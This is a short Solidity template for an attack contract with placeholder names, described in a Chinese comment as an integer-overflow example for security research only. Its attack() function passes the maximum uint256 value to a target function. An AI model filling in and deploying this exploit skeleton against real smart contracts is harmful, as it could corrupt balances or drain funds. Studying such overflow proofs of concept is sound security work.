// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title $ATTACK_CONTRACT_NAME
/// @notice 针对 $TARGET_CONTRACT_NAME 的整数溢出示例，仅用于安全研究
interface IOverflowTarget {
    function $OVERFLOW_FUNCTION(uint256 amount) external;
}

contract $ATTACK_CONTRACT_NAME {
    IOverflowTarget public target;

    constructor(address _target) {
        target = IOverflowTarget(_target);
    }

    function attack() external {
        uint256 large = type(uint256).max;
        target.$OVERFLOW_FUNCTION(large);
    }
}

